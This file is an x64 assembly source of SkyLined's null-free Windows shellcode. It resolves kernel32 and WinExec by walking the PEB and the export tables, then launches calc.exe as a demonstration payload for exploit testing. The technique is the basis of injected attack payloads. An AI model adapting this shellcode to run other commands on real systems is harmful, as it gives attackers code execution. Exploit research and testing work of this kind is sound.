; Copyright (c) 2009-2011, Berend-Jan "SkyLined" Wever <berendjanwever@gmail.com>
; Project homepage: http://code.google.com/p/win-exec-calc-shellcode/
; All rights reserved. See COPYRIGHT.txt for details.
BITS 64
; Windows x64 null-free shellcode that executes calc.exe.
; Works in any x64 application for Windows 5.0-7.0 all service packs.
; (See http://skypher.com/wiki/index.php/Hacking/Shellcode).
; Thanks to Peter Ferrie for suggesting to look up kernel32.dll using
; InLoadOrder and WinExec by looking for "WinE" rather than using hashes.

%include 'type-conversion.asm'

%ifdef STACK_ALIGN
    AND     SP, 0xFFF8
%endif
    PUSH    BYTE 0x60                     ; 
    POP     RBX                           ; RBX = 0x60
    MOV     RSI, [GS:RBX]                 ; RSI = [TEB + 0x60] = PEB
    MOV     RSI, [RSI + 0x18]             ; RSI = [PEB + 0x18] = PEB_LDR_DATA
    MOV     RSI, [RSI + 0x10]             ; RSI = [PEB_LDR_DATA + 0x18] = LDR_MODULE InLoadOrder[0] (process)
    LODSQ                                 ; RAX = InLoadOrder[1] (ntdll)
    MOV     RSI, [RAX]                    ; RSI = InLoadOrder[2] (kernel32)
    MOV     RDI, [RSI + 0x30]             ; RDI = [InLoadOrder[2] + 0x30] = kernel32 DllBase
; Found kernel32 base address (RDI)
    ADD     EBX, DWORD [RDI + 0x3C]       ; RBX = 0x60 + [kernel32 + 0x3C] = offset(PE header) + 0x60
    MOV     EBX, DWORD [RDI + RBX + 0x28] ; EBX = [kernel32 + offset(PE header) + 0x88] = offset(export table)
; Found export table offset (RBX)
    MOV     ESI, DWORD [RDI + RBX + 0x20] ; RSI = [kernel32 + offset(export table) + 0x20] = offset(names table)
    ADD     RSI, RDI                      ; RSI = kernel32 + offset(names table) = &(names table)
; Found export names table (RSI)
    MOV     ECX, DWORD [RDI + RBX + 0x24] ; ECX = [kernel32 + offset(export table) + 0x20] = offset(ordinals table)
; Found export ordinals table offset (RCX)
    CQO                                   ; RDX = 0 (eax == userland addresss, so MSB is not set)
find_winexec:
    INC     RDX                           ; EDX = function number + 1
    XOR     RAX, RAX                      ; RAX = 0
    LODSD                                 ; RAX = &(names table[function number]) = offset(function name)
    CMP     [RDI + RAX], DWORD B2DW('W', 'i', 'n', 'E') ; *(DWORD*)(function name) == "WinE" ?
    JNE     find_winexec                  ;
; Found WinExec ordinal (RBX)
    LEA     RDX, [RCX + RDX * 2 - 2]      ; RDX = offset(ordinals table) + (WinExec function number + 1) * 2 - 2 = offset(WinExec function ordinal)
    MOVZX   RDX, WORD [RDI + RDX]         ; RDX = [kernel32 + offset(WinExec function ordinal)] = WinExec function ordinal
    MOV     ESI, DWORD [RDI + RBX + 0x1C] ; RSI = [kernel32 + offset(export table) + 0x1C] = offset(address table)] = offset(address table)
    ADD     RSI, RDI                      ; RSI = kernel32 + offset(address table) = &(address table)
    MOV     ESI, [RSI + RDX * 4]          ; RSI = &(address table)[WinExec ordinal] = offset(WinExec)
    ADD     RSI, RDI                      ; RSI = kernel32 + offset(WinExec) = WinExec
; Found WinExec (RSI)
    PUSH    B2DW('c', 'a', 'l', 'c')      ; Stack = "calc", 0
    PUSH    RSP
    POP     RCX                           ; RCX = &("calc")
    PUSH    RCX                           ; WinExec messes with stack - 
    XOR     RDX, RDX                      ; RDX = 0
    CALL    RSI                           ; WinExec(&("calc"), 0);
    INT3                                  ; Crash
